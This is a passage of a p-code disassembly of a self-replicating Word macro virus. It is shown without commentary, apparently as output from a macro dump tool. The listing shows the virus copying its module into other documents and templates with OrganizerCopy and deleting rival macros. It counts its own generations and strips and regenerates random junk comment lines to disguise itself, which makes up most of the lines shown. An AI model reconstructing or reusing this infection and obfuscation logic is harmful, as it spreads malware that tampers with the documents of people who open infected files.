' 	Rem 0x000A " ºÀà¡ÑØþøÆ"
' Line #320:
' 	QuoteRem 0x0000 0x0010 "¼ÃÑ¥ºÑÙ¬üç¬Ø¤î¼å"
' Line #321:
' Line #322:
' 	Rem 0x001C " ¨ñŸæø³¹Êý­ö áÃõòÜ¨êé÷þïÇ¶åŸ"
' Line #323:
' 	Rem 0x0006 " ØìÕ¬Ñ"
' Line #324:
' 	QuoteRem 0x0000 0x001B "ò£íê¿ »íÈýÝ¬›µî½²¥Åû÷«Ûó­þ›"
' Line #325:
' 	Rem 0x002C " °ðÛ±ÅÕ«½òØÞßô© À¡ÙÂì©ü¼èâØ¢¸Ûª³²²ó¾â¦Ÿ¬¨þçã"
' Line #326:
' 	Rem 0x0002 " í"
' Line #327:
' 	QuoteRem 0x0000 0x0032 "ò¨žÁúû©¡å÷›ùÃãüà÷Øà ›ÞÅûæä Å§«ö¤Ÿ¼¾ÞÀðýýÕÑæñ¦®çãÛ�"
' Line #328:
' 	Rem 0x0003 " ÷ø"
' Line #329:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NewHome 
' 	MemLd Count 
' 	For 
' Line #330:
' 	QuoteRem 0x0000 0x0019 "Ìæ¿§Ú£ñõ®ÇÁµ¦ÈéÔÆÆçÙž¯Ñä¢"
' Line #331:
' 	QuoteRem 0x0000 0x002A "äºœ×Õœ÷Üïá®ÑëÞÃ´Ç±ªÜ¢Ô§ÀçáôÁÐåÈÀ´µÑð¼µÜœ§ï"
' Line #332:
' 	Rem 0x0022 " ¤ç»ýèÚÝîÄø÷ÃÂÞÄÈÂýµ¹¾µßœ¥¯Ÿ©ëÎÛË¥"
' Line #333:
' 	QuoteRem 0x0000 0x0024 "¹¤îÕÐùÉ÷Ô½ÅÀüÜé¬àñéž¸²í­éä¯¬­®ÖÅø´·Í"
' Line #334:
' 	Rem 0x0033 " ª±ØÉÄ¿ªÜ¤·²Ù¶­ø¢¢«Ûæ¿�Ýà·éÔ£Ç�¿úúö±Ö¦ü²åôÞÝË±ã©ú÷£"
' Line #335:
' 	Rem 0x0010 " Éé¨úÆËüÇêåø¦ð£¨"
' Line #336:
' 	Rem 0x0002 " ê"
' Line #337:
' 	Rem 0x0026 " ªÈá¸¤µ¨²¾žóÇý¡í»žØíªë²ôïëî ¶ÎÅöÓîâ ó¾"
' Line #338:
' 	Ld i 
' 	Ld NewHome 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	Ld MacrosID 
' 	Eq 
' 	IfBlock 
' Line #339:
' 	QuoteRem 0x0000 0x0026 "»¦âëÁÇú¨Ÿµð£ø¦ÊÊé´âÎªÈûüõÐÇ¦ÊÝ½¼ëÃÚÚ§Ï"
' Line #340:
' 	Rem 0x000E " ÅÐê¡Üûó¿æÇí©À"
' Line #341:
' 	QuoteRem 0x0000 0x000C "ð½�×ëöâ›ðçœÀ"
' Line #342:
' 	Rem 0x0011 " õÀÊªÎ½ùÆÀ¾ïàÌ¦þÜ"
' Line #343:
' 	QuoteRem 0x0000 0x0016 "Ð¥µ²íª©»¨«�Û Ò«¦à®¸²Óå"
' Line #344:
' 	Rem 0x002F " µÓÌ¸øÈõÒÀ¬¿ ›ÜÎÐÏþÐ«½«õ«äÏý¬ç¡·ºû¼Ð£é³ËüàÍÃê­ô"
' Line #345:
' 	Rem 0x000A " À¯ÚÛÊ›âåø"
' Line #346:
' 	ExitSub 
' Line #347:
' 	QuoteRem 0x0000 0x0006 "Áïú³¸ü"
' Line #348:
' 	Rem 0x002A " ÃÌÆœñ¢Ë¬°¼ÎÇ�çÆí·Ð¯¡ÜöÄ¥·ÒÔ¤ÖÈ©¿ÙÞ½÷°ðàôù"
' Line #349:
' 	QuoteRem 0x0000 0x0022 "ÖìÜ›ÃÚ±ù¾°õ¾Ï¹Þã¥°äô¸¸³ìõ£ë¨à¯àÊÍ¤"
' Line #350:
' 	ElseBlock 
' Line #351:
' 	QuoteRem 0x0000 0x002D "½ÒÑîý Óò¶Þ›ÉËë¡áµàÇ¬íõô·ðÑÐÁ®µñÝ·üÖá·¼©òŸ›œÄç"
' Line #352:
' 	Rem 0x000E " »ÀÉìûè¦¢ÀâË§É"
' Line #353:
' 	QuoteRem 0x0000 0x0004 "½é¶ü"
' Line #354:
' 	QuoteRem 0x0000 0x0028 "Êâ­³Éª¼«Á§ŸòÉŸÏÊ·ÂæàÜûíù¶ëý­¬›ÄÑôªéáÁÕÒø"
' Line #355:
' 	QuoteRem 0x0000 0x0022 "Ÿ Áõ«ùàäžûÍÈ² ÷îñÕìÑ¿ùóÚ�ûÙç¸úž­îÖ"
' Line #356:
' 	QuoteRem 0x0001 0x0024 "=> Êîíêóðåíò ??? K.i.i.i.l.l.l it..."
' Line #357:
' 	Rem 0x0023 " Õ¾¤œõ¥Æùœê›¤à  ©Ùé¦›åŸª§ÄæÜÏ±¡¸Ù×Ö"
' Line #358:
' 	QuoteRem 0x0000 0x000C "°¹¿ÑŸ¯¶ç´ãœ½"
' Line #359:
' 	Rem 0x0004 " Óíè"
' Line #360:
' 	Rem 0x0028 " ÛÓ®ã®ÛÏèÚ²çäÅÚúâÚ¿ÍÙúüÞôÒßâúÔçëÊÈ×à½ùÔ¬"
' Line #361:
' 	Rem 0x0004 " ß°ú"
' Line #362:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	Ld NewHome 
' 	ArgsMemLd Item 0x0001 
' 	Ld NewHome 
' 	ArgsMemCall Remove 0x0001 
' 	EndIf 
' Line #363:
' 	Rem 0x0007 " úë­Ÿ›è"
' Line #364:
' 	EndIfBlock 
' Line #365:
' 	Rem 0x002C " ÀÍÆ´¾Æì¼¨æ×ËðæòÜ«­·¢åÜúÑÛã«Ãºåê³ÂËÆÅ³ÍÁ·¸³µ"
' Line #366:
' 	QuoteRem 0x0000 0x0030 "òÉýòùº ×àýüç°¯éÞ³ÛÞ®î¢Ç½à¾êÎ·�²ÕÞêñÞ­ÛñãâïàåðÎ¥÷"
' Line #367:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #368:
' 	Rem 0x0007 " Âèà·åâ"
' Line #369:
' 	QuoteRem 0x0000 0x0021 "Ã£±èÕñßè«§ÚÊ­Å¿¬­óÇ½­Ÿ©½ÓÏÚöÒ¸ðÁÐ"
' Line #370:
' 	QuoteRem 0x0000 0x0028 "â§«›«÷ýØï¥ÒÁôÝÍºÊÐêÌÑº¸³·ïª¡ÂÏôºœ¹¸ÕÏÒýø"
' Line #371:
' 	Rem 0x0018 " ìæºêùÌÈ¢ä�÷²»ðÁãþ îù»ôÝ"
' Line #372:
' 	QuoteRem 0x0000 0x0002 "¶¹"
' Line #373:
' 	Rem 0x0023 " øéÚ÷»õ«Å¹µôÕÕüõìí«·ÒÝ­ÃÃ·Øüööþìµú¶"
' Line #374:
' 	QuoteRem 0x0000 0x0014 "÷¨¿ª¦ð£ œªùýÌØÙÑãöÌ½"
' Line #375:
' Line #376:
' 	QuoteRem 0x0000 0x0013 "î½žÙý¾Ä¢ÕÃÉþ¿³°æñªø"
' Line #377:
' 	QuoteRem 0x0000 0x002F "¯ßíß£Ëì¿ó»ºÊÅ÷ÞãÈ«ÙÓØÁÛ´ ¹üåñêÇ´¸¾ýàÖ¾øàéœ¦Ïü¥Ó"
' Line #378:
' 	QuoteRem 0x0000 0x0011 "=> ïåðåñåëåíèå..."
' Line #379:
' 	QuoteRem 0x0000 0x001A "¬¶Â½ô¡ò£ðÃü¬¥ê¦Ö¯·¥œÊÐòó¥â"
' Line #380:
' 	Rem 0x0030 " ô¥­ÀíÆÕì¿›¡ÐËÓ¼ÔÌô›¾Ó­Æ÷œ§ÌõÂèõµ³®ËèÞæ�¶Ú·úÙûùê"
' Line #381:
' 	Rem 0x0029 " èºÚ¬¥ÇÒªÝýŸ¢Ãü¬±«óÝìúÓ­¸©óºÀµ¬´ïÛÀÀ¦çý¿Ë"
' Line #382:
' 	Rem 0x0010 " ¶³½ôµÄ³á›¼ç œøé"
' Line #383:
' 	Ld oldPath 
' 	ParamNamed Source 
' 	Ld newPath 
' 	ParamNamed Destination 
' 	Ld MacrosID 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #384:
' 	QuoteRem 0x0000 0x000A "²½ËþäÑÒËôó"
' Line #385:
' 	Rem 0x0015 " ÌýÓý·ÎþÄÛ¹è»ó»²«Å·ÀÁ"
' Line #386:
' 	Rem 0x002D " Ö³´«©À¯ýÄ¤±¬óÂüÞïìÖ�øô ±ºÔ¸Æà«žÁ ®ÆÔ¦óÄ©×ÓéØ"
' Line #387:
' 	Rem 0x0016 " ¦²·¯¹°È§ý×âæ×›Ëµ¸ú¼ÆÊ"
' Line #388:
' 	Ld MacrosID 
' 	ArgsLd NewHome 0x0001 
' 	ArgsCall (Call) UnREM 0x0001 
' Line #389:
' 	Rem 0x002E " ²¯ïÖÂÛÉØÅ�ç®þ¯¹¦Á¹ö·Ô½äè£ÞôÒØ¨¡¨ÂþØé¶ÙÝØÙóè¾ó"
' Line #390:
' 	Rem 0x001D " úýªÁéÅêÂè§Á±«¡üü¡ØÀÂäÜóèÜÆÝé"
' Line #391:
' 	QuoteRem 0x0000 0x0029 "üòäÌ�Ôí¿àÆÀ¨ùçïŸý©ü×­Ú�äçæíÔ°³Ù¨ÇÐÒÛäüœÚÂ"
' Line #392:
' 	QuoteRem 0x0000 0x0012 "î®œ®çÍÐý£µë´äÙÓ³ç¿"
' Line #393:
' 	Rem 0x0006 " ù¤ÂÎ©"
' Line #394:
' Line #395:
' 	QuoteRem 0x0000 0x0003 "Æ³Ò"
' Line #396:
' 	Rem 0x0004 " ûÄë"
' Line #397:
' 	QuoteRem 0x0000 0x0007 "¦«éÈÁ�ó"
' Line #398:
' 	Rem 0x002A " ýâüÅåì¶Æàâ£´¯þÔÔÝ¬¦È¶»ÇðØÃØï÷ÃÙÕ©ªñ¢äþºØ®"
' Line #399:
' 	QuoteRem 0x0000 0x001E "¢ÁÏäïÔ´ÊÖ®ÖÒãÆßÓÛÑÍÇãíêõ¡ÊÞÔö¦"
' Line #400:
' 	Rem 0x0004 " ü¤³"
' Line #401:
' 	QuoteRem 0x0000 0x0021 "Ñóô¸©ÌÑßã»«´ËÃÙÕ¦¿÷ðÑ¤Á·ÐŸÓÄöÀö Ý"
' Line #402:
' 	QuoteRem 0x0000 0x0027 "žå²çâÒ ´©»ºË§¥ÔèöÒÈ¥áÒ£¤ñÆ¨Ù÷Ÿä¸¸ÓžÓèŸÕ"
' Line #403:
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	Ld MacrosID 
' 	ArgsLd NewHome 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St GL$ 
' Line #404:
' 	Rem 0x0012 " ÊÁºó¨·ã¤ý¡©¶éÀëµå"
' Line #405:
' 	Rem 0x0005 " çÀûÎ"
' Line #406:
' 	Ld GL$ 
' 	Ld GL$ 
' 	FnLen 
' 	LitDI2 0x0014 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Val 0x0001 
' 	St GN 
' Line #407:
' 	Rem 0x0026 " î¶Û·Ú§¤Ü§Óéºäæö×ÔéóµàüÅœž÷È¡­·Þ³ò¼úõ¬"
' Line #408:
' 	Rem 0x0020 " ÜÏ±±àÅ§Æ£û¬¢Õ›­ÁÀ°ØàÇç¿ûìï»°Âòß"
' Line #409:
' 	QuoteRem 0x0000 0x000F "Êû­·µëêï¶Ñ£®¯Êð"
' Line #410:
' 	Rem 0x001E " ÷ëúäŸ­¼ä½ªÖ®þò¬ûòÁöãÂ­°ÊýÛùçÆ"
' Line #411:
' 	Rem 0x002D " ÞúÎÅÑ÷Ó©ÌÊÍ½×çÎÂø ÐÆµÊïÑÑÕÈÜ©Þ­²óëÐáß×ºÕ¥ìûÌ"
' Line #412:
' 	Rem 0x0015 " ááÀÕ¾ß¾Ûý­ÆÇ³®îçÊ×ŸÒ"
' Line #413:
' 	Rem 0x0014 " ×ÝÛœÏÉµòÕ¥ÜÉ´ÔÓÎÊÌí"
' Line #414:
' 	Rem 0x002D " ÜãÂ¶»©Ô§¹Á¡éáêæäÎ¦½£ñ×þÏ¦ôç£ÙÕçÖ¹Ù¤ú÷ÅÍ£©Ýïß"
' Line #415:
' 	LitStr 0x0013 "'=>Ìîÿ êîïèÿ íîìåð:"
' 	Ld GN 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	St GL$ 
' Line #416:
' 	QuoteRem 0x0000 0x002A "àŸ³åÒÉæÜ¬·Ÿ¶ÛÙÊÁêÌÝ©¼¬Îäõ¬§êé¥ÂÕÀ¬¿öÉÍ¼êª®"
' Line #417:
' 	LitDI2 0x0005 
' 	Ld GL$ 
' 	Ld MacrosID 
' 	ArgsLd NewHome 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #418:
' 	Rem 0x0013 " £äàá»ÑÂóÝÚØÑËÌéÑÛ¶"
' Line #419:
' Line #420:
' 	Rem 0x0003 " ®à"
' Line #421:
' 	QuoteRem 0x0000 0x0015 "ÓäÇøáÉÐØÒœ·ò›Þ¢üœÉü¬Ë"
' Line #422:
' 	Ld MacrosID 
' 	ArgsLd NewHome 0x0001 
' 	ArgsCall (Call) GenerateRems 0x0001 
' Line #423:
' 	QuoteRem 0x0000 0x0017 "ðîéÒÈøÉ¸Üï›ÖÜíêé¬âÍ´æîÀ"
' Line #424:
' 	Rem 0x0008 " Ü«»í±÷Â"
' Line #425:
' 	Rem 0x0022 " ÇþñËÌ°íÈíµºíó¯ì§½ÐÍã³ËÄÎ£Ÿ±¿Ëé÷³à"
' Line #426:
' 	QuoteRem 0x0000 0x002B "¬îû¸õï Âº·ÉÞÖæîþ¬«ñòÂáÄÃõÕºðñÎðœðù§¸Ñ žØ§È«"
' Line #427:
' 	Rem 0x001C " ã±÷Ÿ×ÇÈÚþÑ¤ààÔ¾ÓòÉ­¿º¶�âÄ»ß"
' Line #428:
' Line #429:
' 	Rem 0x0007 " ü¢¯ìœ¬"
' Line #430:
' 	QuoteRem 0x0000 0x0009 "ÂÕöÍþÔ¶ªÙ"
' Line #431:
' 	Label Done 
' Line #432:
' 	QuoteRem 0x0000 0x0023 "ÁÒÃžâçóþ½¤ý±ïè­àþÂô×ôÔÇÄîÂëÜõÑ Ìº¶Þ"
' Line #433:
' 	QuoteRem 0x0000 0x0015 "ŸÈª¹ù·éíõ×úÔÒß¿­úÑ½¼ý"
' Line #434:
' 	QuoteRem 0x0000 0x0011 "ÁÎí¥â¾×âïò¢ó¶Ì±©§"
' Line #435:
' 	EndSub 
' Line #436:
' 	Rem 0x0011 " ÊÍñâÊ£­Ã¯¯Òé¹ù›³"
' Line #437:
' 	Rem 0x0014 " ÜíãØã¸ýÖ·öûîá›Ä¤õ²ý"
' Line #438:
' 	QuoteRem 0x0000 0x0022 "ß¬ôã×óªÓþèü¸õÆØÀÉ©¢øÞÔººü¦©µÐùõû¶û"
' Line #439:
' 	QuoteRem 0x0000 0x000F "â»ÍÉÉò°›Ò®¯ýÌÊê"
' Line #440:
' 	QuoteRem 0x0000 0x0031 "«Ø´á·ÏÆ­Ó¹Ÿ¶¶žþáñ»ßãº­²¿±äÏËáÕðÓú Ì·Ý¡ðê¡ëÑçï­�­â"
' Line #441:
' Line #442:
' 	QuoteRem 0x0000 0x0006 "ëåÊøåÑ"
' Line #443:
' 	QuoteRem 0x0000 0x0019 "Ð¸¢ò«þþìù×œûÜçÅðÀ¬·ã£éø ¡"
' Line #444:
' 	QuoteRem 0x0000 0x002A "ïûý¶ßàèåÓ›çåÀñþÀµÔÎÜÚÖï³ù¯¥ö¸íþëà§ÂÅ£õð½¯á"
' Line #445:
' 	QuoteRem 0x0000 0x0010 "¢©£Ãº�Ä°®±Ÿ¾Å¸·¢"
' Line #446:
' 	Rem 0x000C " ¿ð¢Å§ÁíóÂ½Ä"
' Line #447:
' 	Rem 0x0029 " ìþËáÔß±ë¡ÙýÙ¥æÓÜÂÄààçÖ£Í§ü¾±¯èÒÒ£³Ùá¾þÃœ"
' Line #448:
' 	Rem 0x0032 " ÕÄúÑ²ÔðË²î�î¼ó×Ûœ­Ãò¨§Èõµø°ìèÃÎËåµ¿¿ÐÀÃ›ªØ¤ÁÁØê÷×"
' Line #449:
' 	FuncDefn (Sub UnREM(UnREMObject As Object))
' Line #450:
' 	Rem 0x0023 " È³ö¡¨±ØåÒº ¥®�ííÞÂœ£ªóÇïÇžÝõîößáâ´"
' Line #451:
' 	Rem 0x000A " ùÆ�Áû£æüÚ"
' Line #452:
' 	Rem 0x000C " ÎñþÝìûËÑìæË"
' Line #453:
' 	QuoteRem 0x0000 0x0010 "Å¾à×©Ïú¸ÅÂ÷¼± Ö­"
' Line #454:
' 	Rem 0x0014 " ãž½Îº·¸¶ñóÏº½¾¤º÷Úû"
' Line #455:
' 	OnError Done 
' Line #456:
' 	Rem 0x0018 " ¸ûè«ÒÔÑîÃª¥ûº·øÕò¢ñÚûñ¢"
' Line #457:
' 	QuoteRem 0x0000 0x0016 "ÙíÀÂªùÞ´û Ì«ýÒœ«ûÂöþÝÌ"
' Line #458:
' 	Rem 0x001F " å�Þ¸Ê¿åÑ©òÅÛ°¼éŸ´°ô¶ÚØíëô¢ÉØýû"
' Line #459:
' 	Rem 0x0014 " ¦ëÖæÌ­ÛçáÑÀøôÙûÀßäü"
' Line #460:
' 	QuoteRem 0x0000 0x0007 "ß½žêÖ°Â"
' Line #461:
' 	Dim 
' 	VarDefn i (As Integer)
' 	VarDefn A
' 	VarDefn B
' 	VarDefn C (As String)
' Line #462:
' 	Rem 0x001D " ³ŸÞýÐ¶Ììøª¸ìÌÐè¹ú¢¢»õœäßÔÍÇæ"
' Line #463:
' 	Rem 0x0009 " ÍŸýÀ¦Çñ¨"
' Line #464:
' 	Rem 0x0022 " é¼×¾ÐÊæöÏ¸âÑïÆä÷ªò¢ß¶¢ÎøÒùÔÓüÇË»�"
' Line #465:
' 	QuoteRem 0x0000 0x0004 "Ô¶¢Ð"
' Line #466:
' 	QuoteRem 0x0000 0x000B "¬§°«ÉÛ«ÊäûÖ"
' Line #467:
' 	Rem 0x0014 " º°ÞÕÑø¡Ð¤ï¿¶å¡øÝ£´È"
' Line #468:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld UnREMObject 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #469:
' 	Rem 0x0005 " £ÈÇÍ"
' Line #470:
' 	QuoteRem 0x0000 0x0004 "Ô¢Âï"
' Line #471:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld UnREMObject 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St A 
' 	BoS 0x0000 
' 	Ld A 
' 	ArgsLd Trim$ 0x0001 
' 	St A 
' Line #472:
' 	QuoteRem 0x0000 0x002F "«ÊªÀæ¢œÑâÏÆãÕÀ®µ·¥¸íä¤�´»Áã°¡§¿ÊÎïì¤ÇÂöµµãµò®¿ç"
' Line #473:
' 	Label delTAB 
' Line #474:
' 	QuoteRem 0x0000 0x0014 "õÖÝÔîªåð¨ÌÛ£ÃÔÊ¦ÍÊùœ"
' Line #475:
' 	Rem 0x0027 " æîª×îž ª¬ç¼ÙÔï›ÝžÉõÉ÷á±¦ôçîâ×÷¸± ¹á§î½"
' Line #476:
' 	Rem 0x0012 " œ�®§ìòÜÏŸÝÙ¼²ùöêÙ"
' Line #477:
' 	QuoteRem 0x0000 0x0020 "žç¡ûõý×ËÜÑµ¯¯Õñ¢»äÙñÈ×øó¼øêÒ¾Ì å"
' Line #478:
' 	QuoteRem 0x0000 0x000C "Åå›Â°¦Ä»ç²Èâ"
' Line #479:
' 	Rem 0x0017 " ÅÝ£ä«Õå¶Þ¿®´Ì¾ÚÎêûüâ´¨"
' Line #480:
' 	QuoteRem 0x0000 0x002A "ÙÌíÀ«µ©¶Ýû¯½¿ëÓÃÓñ¨¥øŸÈ¸ÞàÝþ¾Ÿ°µÍÃÂá�¡Ïè³û"
' Line #481:
' 	Ld A 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St B 
' 	BoS 0x0000 
' 	Ld A 
' 	LitDI2 0x0001 
' 	Ld A 
' 	FnLen 
' 	Paren 
' 	ArgsLd Mid$$ 0x0003 
' 	St C 
' Line #482:
' 	Rem 0x000C " ¦ðð²éÕ®ÃÅ›Ý"
' Line #483:
' 	QuoteRem 0x0000 0x0023 "ÊÝžüÑü¶ÄÇ¼èû¾ÝÂ›»®«¾¤°õÉÌÙØºä±Ð§Áëœ"
' Line #484:
' 	Ld B 
' 	Ld vbTab 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld C 
' 	St A 
' 	Else 
' 	BoSImplicit 
' 	GoTo endTAB 
' 	EndIf 
' Line #485:
' 	QuoteRem 0x0000 0x0005 "ªïû¼¨"
' Line #486:
' 	Rem 0x002E " Ñ¼ÇµÙ­Áå¤ê³ïÊ¸Ô§ÔùÎ½Ð›²°Ú¾ õìëÇ³œ¶Ùä¬Õž¶£¦ÉØð"
' Line #487:
' 	Rem 0x0032 " Ú¹ûì»øä´Ëç¤Á²ñÏá³ÜÆóãù¢©ªç£ËæðôÒå›í¿¹¥÷Þ½ô×¬÷ÔþÇÔ"
' Line #488:
' 	Rem 0x0031 " Ó®žÀÓðäøÚ³Ò¶üõ¶äÎ´§¶º´Ø¤èú ùÌàî¹›¥Î°©ï×ñµŸ¡ü§×àö"
' Line #489:
' 	QuoteRem 0x0000 0x002C "¥ÏŸßÎèÏ¶À£â¢ÓÈÓÆÍ¹ãÕù¥â¨Êåñ¹òÕûõ§Áß¥®óçñÛ©ø®"
' Line #490:
' 	QuoteRem 0x0000 0x0010 "Ôª£¿©Ò¿ó¼Êò¶žÉÃú"
' Line #491:
' 	Rem 0x0018 " ·Ô£þ´ÙïàùïœÏµµÂ±¾¥³±ÇÃÉ"
' Line #492:
' 	Rem 0x0021 " ¹ÊÓòµ÷Ÿßë¥ëµ±¥äÁôèÎÅ¿½ÙÃµòŸéóÇéž"
' Line #493:
' 	GoTo delTAB 
' Line #494:
' 	Rem 0x0030 " òá¯¼ÄëÓœîõôù ›¢Û÷°é¹¼ÑóÍþÒÙàüãÐÇœÏ¨ÃÒ¸»£ÓòÑ¸Ÿöç"
' Line #495:
' 	Rem 0x0022 " ž ´±Ý¥¡ÚÙ½ä¶Ñð«ñö¢±±ý°Ìž¾ÄæÇ¼Ý¯· "
' Line #496:
' 	Rem 0x001E " ­¾Á®¼»ùñŸäìàž¦¿æÌÖ¤âïÓï¹½üÛÓ¼"
' Line #497:
' 	QuoteRem 0x0000 0x001C "ë¸ºÔ¾Ýðè¡¿œµÍ¦»¼ûÉðë®Öã«õðÓÏ"
' Line #498:
' 	QuoteRem 0x0000 0x002E "Ñ·½Ü·Íž±È¬¹¼¤Ÿ¡áé½í²É¬Åñ äÎ¡ì¬ëªÈ¹�¾üžÞ×»ÌÐŸà›"
' Line #499:
' 	QuoteRem 0x0000 0x001F "àã¹ôª¡ð´èó¦ ÈÄØ¥ÅóëÍ¥þèÃà¢åÖÑþ¹"
' Line #500:
' 	QuoteRem 0x0000 0x0024 "íÀÑÜ¹ü¿¥üÞ÷®¤ïÑß¾Ü¬Á²è°è´ô¡¾î÷Äèþ›µÜ"
' Line #501:
' 	Rem 0x0028 " é³¼ªèæ¡û¡È ÑÊÑÖ«ÚêÁùÓïÂ«úÀÔª«ô³¦¤Ç»Ïáð¬"
' Line #502:
' 	Label endTAB 
' Line #503:
' 	QuoteRem 0x0000 0x0004 "¼ÈË¹"
' Line #504:
' 	QuoteRem 0x0000 0x001F "´ûëó­äÍÌû¹ôë»¤Ù¢öôµçé°³æä¿Ñ¼º¿¡"
' Line #505:
' 	QuoteRem 0x0000 0x0012 "ÎñÝœå›Âžé»öïûäÖìîÎ"
' Line #506:
' 	Rem 0x002D " Ò©¾¡ûœ¬ŸÉñ¸ÈÛôµ©Öæ»èŸ­Éì±Å§ÃÊÄàíÕáãðø¥÷éºªô²"
' Line #507:
' 	QuoteRem 0x0000 0x0026 "ÛÞþÕåæ·íÄ¼ÖÐªµ�¹¼ûžç»àÍ©ÒØÚé±ÕÓµèàÝ½¨Ö"
' Line #508:
' 	Rem 0x0016 " ãÌêõ©›âÑáÛØ¬Ù¬óËŸÙ©×å"
' Line #509:
' 	Ld A 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd UCase$ 0x0001 
' 	St B 
' 	BoS 0x0000 
' 	Ld A 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St C 
' Line #510:
' 	QuoteRem 0x0000 0x0024 "Ù¹¼ñûòØïÁÁÐÀÓ¯çÈéúŸè¤ô¹É¾÷ÓÈ÷ÀÉß¬Öâœ"
' Line #511:
' 	QuoteRem 0x0000 0x0029 "¨ô½¦ÒëòÈÂÂÐýŸÅ°ÇýÆÉÖ×¬²œîçÀÜÏØë§Ï¦ÕæÑ�Ó¿ì"
' Line #512:
' 	Ld B 
' 	LitStr 0x0003 "REM"
' 	Eq 
' 	IfBlock 
' Line #513:
' 	QuoteRem 0x0000 0x0008 "½ùÆÅ¨ã»ä"
' Line #514:
' 	Ld i 
' 	Ld UnREMObject 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #515:
' 	QuoteRem 0x0000 0x002B "Ö¥ó¯ÕËÎæ·ýí¡Ä´ô¢Ï³ãøØÛ­±ÅüàöÆÆ×¨ãÌÁÚÉ¹Ó�µæÁ"
' Line #516:
' 	Rem 0x002A " À²ôÎõêÏÂÞ›¢žäß°êÝ›Üý²ÙÙÄâ×¡Ü ¨ÚªÛõËùœ¶Ý¶ª"
' Line #517:
' 	QuoteRem 0x0000 0x001D "ïØž«ôÂÜ­üÏ÷ªÍÆË¾ £ÅÝÄçåºÃêÌ»¾"
' Line #518:
' 	Rem 0x0010 " çÉï¤çï½Â­¸ÖÛ­î­"
' Line #519:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	St i 
' Line #520:
' 	Rem 0x0031 " ¡Õì¢ÊÖðÊÉëÉâº¸ÓÊÛ®ûä²¢¨ÏÝ§ßÍÝ¥Ò±²û °Ê¹Ôç²Ñ¡ÈÇì¶Ê"
' Line #521:
' 	Rem 0x0011 " äÜéÏÌ¶ùâÙÖØÑÃ®êõ"
' Line #522:
' 	Rem 0x0005 " Ìâùñ"
' Line #523:
' 	QuoteRem 0x0000 0x0030 "¤ßô¨À ìöŸáá×ä§Ýåü±å­ÀÐûçÞ»³ÞÅ¿üàÍÊÀ¢¼ìÚ²ñûâ©»ÞžÓ"
' Line #524:
' 	Rem 0x001D " çóùðüñþËÈœÌñÁé·øÙÌÙ½óû¬ÐÑ›åÎ"
' Line #525:
' 	QuoteRem 0x0000 0x0018 "èÃÄËÓä�Ó¶ÍîÖØúçßÂ©½±á²ëÉ"
' Line #526:
' 	Ld C 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Paren 
' 	Ld B 
' 	LitStr 0x0003 "'=>"
' 	Ne 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #527:
' 	Rem 0x0006 " œÆ³Øú"
' Line #528:
' 	Rem 0x002C " Âìãé¾¯ËÊ¥³µ±¾åë°µ§ ¢Ö¢£þÎœôÈ´°îìÆäòÔ¬§×Ëýìô"
' Line #529:
' 	Rem 0x0022 " ·Ë±¥�¨ÊË©Û¢¥ñÔåÅÚçÈ³£ÍãàÞÕÛ®ªþßþÞ"
' Line #530:
' 	Rem 0x0026 " ÓèÄœáœÑîÀÂúà½Óõ­Ñá¡ë©®ÃžÈ¤œ¢Ì²ÏÈÁ°À¸Ç"
' Line #531:
' 	Ld i 
' 	Ld UnREMObject 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #532:
' 	QuoteRem 0x0000 0x0020 "ŸÉËõ±¾³¤¡Æ�ÅåžžåËËÆœ¢¼ìñ¶¯ÉõùÎ¹ê"
' Line #533:
' 	Rem 0x0007 " Üü¸¼å¶"
' Line #534:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	St i 
' Line #535:
' 	QuoteRem 0x0000 0x0007 "¬áÏÇóþ¬"
' Line #536:
' 	Rem 0x002E " ø¸´ÕúÓ«ÇÅï£¬ÌÑ÷Ëçð¿í×ØŸÜ³œÖÑá›½ùºÉëä©©ùÌ£¼¤Ùá"
' Line #537:
' 	QuoteRem 0x0000 0x000C "Ÿñµ£í¡æžÆÖðÈ"
' Line #538:
' 	Rem 0x0022 " ëç§Å®ÇÁÓëµÝ«¾¹±®òÛ³êõòÂØÁ¹¨úÁ›èØÇ"
' Line #539:
' 	QuoteRem 0x0000 0x0027 "Ëí§Ú÷À×Ñò²ß£à³�Þé¦ß×ü¾»¼Óù¯Ð´åôòâàíÔúàÅ"
' Line #540:
' 	Rem 0x001E " º®¶õ®Á÷ ²ÎÒïÌÓÚÙó�®üÓÑÚ¼ªÍº¿Ø"
' Line #541:
' 	Rem 0x000C "  ùëöÒÕ­ÕíØ¹"
' Line #542:
' 	EndIfBlock 
' Line #543:
